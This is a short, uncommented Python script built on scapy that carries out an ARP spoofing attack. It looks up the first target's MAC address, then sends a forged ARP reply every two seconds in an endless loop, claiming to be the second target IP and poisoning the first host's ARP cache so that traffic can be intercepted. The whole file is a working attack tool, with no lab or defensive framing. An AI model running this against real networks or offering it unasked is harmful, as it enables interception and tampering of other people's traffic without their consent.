#!/usr/bin/python3
from scapy.all import *
import sys
import time

target_ip_1 = sys.argv[1]
target_ip_2 = sys.argv[2]

packet_req = ARP(
              hwdst="00:00:00:00:00:00",
              hwtype=1,
              op="who-has",
              ptype="IPv4",
              pdst=target_ip_1)

reply = sr1(packet_req)

packet_reply = ARP(
                hwdst=reply.hwsrc,
                hwtype=1,
            	op="is-at",
		ptype="IPv4",
		psrc=target_ip_2,
		pdst=target_ip_1)
while(True):
   time.sleep(2)
   send(packet_reply)
   

